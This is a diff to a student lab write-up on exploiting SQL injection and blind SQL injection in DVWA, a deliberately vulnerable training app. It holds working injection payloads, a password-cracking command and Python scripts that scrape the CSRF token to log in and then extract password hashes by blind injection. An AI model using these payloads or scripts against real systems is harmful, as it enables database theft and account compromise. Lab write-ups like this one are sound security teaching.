@@ -6,6 +6,7 @@ SQL injection vulnerabilities in `dvwa`
 Our goal is to exploit the vulnerbilities in the **SQL Injection** category on `dvwa`.
 
 *Security Level: low*
+
 Looking at the source code, we notice the following lines of interest:
 ```PHP
 // Get input
@@ -35,6 +36,7 @@ This reveals the following information:
 
 This allows us to build up a structure of the `dvwa` database:
 **dvwa schema**
+
 *guestbook* table, containing:
 - comment_id
 - comment
@@ -51,6 +53,7 @@ This allows us to build up a structure of the `dvwa` database:
 - failed_login
 
 **performance_schema schema**
+
 This schema is a [meta-data schema built into MySQL](https://dev.mysql.com/doc/refman/8.0/en/performance-schema.html). This would be useful to filter out in future.
 
 Constructing a query that reveals the password hashes of all users is now quite trivial:
@@ -60,6 +63,7 @@ Constructing a query that reveals the password hashes of all users is now quite 
 This query reveals the information we are looking for, and was stored [**here**](dvwa_user_passwd.txt). From here if we wanted to penetrate the system we could now try using an offline dictionary attack similar to the approach used in lab2. Since the password hashes don't seem to have salts, this should be relatively easy.
 
 *Security Level: medium*
+
 There are a few changes here compared to the previous level. Database queries aree now sent using POST requests instead of being encoded in the GET request query string. The webpage first checks that the database is connected, then uses `mysqli_real_escape_string()` on the input. This function only affects a few characters, notably the `'` and `"` characters, meaning we can't give queries that try to match strings (which is pretty inconvenient). It escapes these characters by adding backslashes to them. In terms of the actual query, `$id` is no longer wrapped in quotes (presumably since we can't use them anymore so we wouldn't be able to escape).
 
 The main change here is how we can actually perform our SQL injections. The UI now only give us predefined options to pick from, so we will need to send edited POST requests (like in tutorial_4). After sending a manual POST response, the response can be viewed by double-clicking it in the Network menu. For a first test, I changed the POST body to `id=0 OR 1 = 1&Submit=Submit`, which as expected printed all the first and last names in the database.
@@ -67,6 +71,7 @@ The main change here is how we can actually perform our SQL injections. The UI n
 With the information we gathered in the previous difficulty level, using a the following POST body extracts the usernames and passwords: `id=0 UNION SELECT user AS first_name, password AS last_name FROM users&Submit=Submit`. However, if we want to perform the same information gathering as before, our task becomes more difficult as we can no longer filter for the table we are interested in. We can still try and guess table / column names, and if they don't exist we will get an error as a result, or sift through the meta-data manually.
 
 *Security Level: high*
+
 This level seems to be much easier than the previous one, and is essentially a copy of *low*. The only difference is that there is now a `LIMIT 1` at the end of our query, but this can be commented out using the same type of query used in *low*. On the UI side of things, we need to click the link to open the dialog box to change our ID, but this field is free-form so we are free to enter any commands we want. The data is now transferred by a seperate `SESSION`, rather than a GET request, but this does not stop the vulnerability.
 
 Blind SQL injection vulnerabilities in DVWA
@@ -76,6 +81,7 @@ Our goal is to exploit the vulnerabilities in DVWA's SQL Injection (Blind) categ
 In this category, we are essentially able to ask YES/NO questions to the web application, which will allow us to recover information 1 bit at a time.
 
 *Security Level: low*
+
 In this case, our input is simply passed in completely unsanitized to the database:
 ```PHP
 // Get input
@@ -123,5 +129,85 @@ abc123           (gordonb)
 ```
 The password for gordonb is therefore abc123, which works when trying to login! To see the password again after cracking it, you can run `john --show --format=Raw-MD5 hash.txt`.
 
-<a name="automated"></a> Automating aa blind SQL injection against DVWA
+*Security Level: medium*
+
+The source code here is very similar to the medium level for the non-blind SQL injection. Essentially, we need to change the id as within the body of the POST request using the developer tools, and we need to be careful as `'` and `"` are escaped due to `mysqli_real_escape_string`, so we can no longer use them in our query. In order to get around this, we can use the SQL function `ASCII(character)`, which returns the ASCII value of a character. This way, we can still ask TRUE/FALSE questions to gather information on the contents of the password hash by setting the value of id in the POST body to `2 AND ascii(substring(password, 1, 1)) = 101`. Repeating this for each character in password would let you build up the entire hash.
+
+*Security Level: high*
+
+The code here is also the same as it was for the non-blind SQL injection. We can enter our payload directly into the session window as our input is once again passed in unsanitized. This means we can use any of the approaches outlined above to obtain TRUE/FALSE responses on the contents of the database.
+
+
+<a name="automated"></a>Automating aa blind SQL injection against DVWA
 -------------
+As mentioned above, asking TRUE/FALSE questions to determine the contents of the password hash would be a very slow and time consuming process. Employing a programatic approach solves this issue. To do this, I wrote a python script (with some serious help from [Bad_Jubies](https://bad-jubies.github.io/Blind-SQLi-1/)). To send HTTP requests in python, we can use the `requests` library. The first issue is that in order to send requests to DVWA, we need to authenticate ourselves first.
+
+To do this, we need to figure out how logging in works. Using the developer tools, we can check what requests are sent: once we login we send a POST request with the following body:
+```
+username=admin&password=password&Login=Login&user_token=b67680b936ab330d3a6c8e0d81a5ae07
+```
+We therefore have 3 fields we need to worry about, `username` and `password` (gee I wonder what those are for), and `user_token`, which is a bit less obvious. When inspecting the source code for `login.php` using the developer tools, we notice the following field of interest:
+```html
+<input type="hidden" name"user_token" value="b67680b936ab330d3a6c8e0d81a5ae07">
+```
+This is a token used to prevent CSRF (Cross-Site Request Forgery) attacks, and must be sent with the login POST request to be authenticated successfully. Therefore in order to programatically login, we need to find this token in the webpage and attach it to our request. To do this, we note that the token is a 32 character long sequence of lower case alphabetical and numeric characters, so we can use python's regex library `re` to find it. Luckily, this token is the only part of the webpage which matches this regex so we can simply find `r'([a-z,0-9]){32}'`, but if it wasn't we could use a more advanced regex as follows:
+```
+r"(?<=<input type='hidden' name='user_token' value=')([a-z,0-9]){32}(?=')"
+```
+This ensures that the token `([a-z,0-9]){32}` is preceeded by `<input type='hidden' name='user_token' value='` and succeeded by `'`. For more information on python regexes see [here](https://docs.python.org/3/library/re.html). With this information, we can now obtain all the information required by our POST request. This is handled in the `login` function, which returns an authenticated session:
+```Python
+def login(rhost):
+    s = requests.session()
+    login_url = f"http://{rhost}/dvwa/login.php"
+    req = s.get(login_url)
+    match = re.search(r"(?<=<input type='hidden' name='user_token' value=')([a-z,0-9]){32}(?=')", req.text)
+    token = match.group(0) # Extracts the regex that was matched
+    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
+    login = s.post(login_url, data=data)
+    if "Welcome" in login.text:
+        print("login successful")
+    return s
+```
+
+Once we have authenticataed our session, we can move onto performing our SQL injection. For the initial approach, we loop through every printable ascii character over the length of the password hash in the database (32). Spaces in our query string are replaced with open-close multiline comments `/**/` to prevent our spaces being replaced by `+` or `%20` in our html query (I don't know if this is actually an issue but I do as the guide commands). Once we make our query, we can check if the response is TRUE or FALSE by checking if the response contains `"User ID exists"`. This is done in the `blindSqli` function, which returns the session and the response to our query:
+```Python
+# Finds characters iterating through all ASCII characters
+def blindSqli(rhost, session_object, my_query):
+    my_query = my_query.replace(" ", "/**/")
+    extracted_data = ""
+    for index in range(1,33): # Indices of password hash [1-32]
+        for i in range(32, 126): # Loops through all ASCII characcters
+            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))={i}/**/%23"
+            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
+            if "User ID exists" in r.text:
+                extracted_data += chr(i)
+                sys.stdout.write(chr(i))
+                sys.stdout.flush()
+    return session_object, extracted_data
+```
+
+I also re-implemented this function using binary search, which is **significantly** faster than the naive implementation. Essentially, we are looking for a character in the range [32-126], and by reformulating our queries, we can eliminate half this searcch space each query by asking if the target character has a value higher or lower than the midpoint of this range. This was done in the `blindSqliFast` function:
+```Python
+# Finds characters through binary search of ASCII characters
+def blindSqliFast(rhost, session_object, my_query):
+    my_query = my_query.replace(" ", "/**/")
+    extracted_data = ""
+    for index in range(1,33):
+        first = 32
+        last = 126
+        found = False
+        while(first != last):
+            mid = first + (last - first) // 2 # floor division
+            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))<={mid}/**/%23"
+            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
+            if "User ID exists" in r.text:
+                last = mid
+            else:
+                first = mid + 1
+        extracted_data += chr(last)
+        sys.stdout.write(chr(last))
+        sys.stdout.flush()
+    return session_object, extracted_data
+```
+
+By default, [blind.py](blind.py) uses the faster implementation, but feel free to have a play around with both!
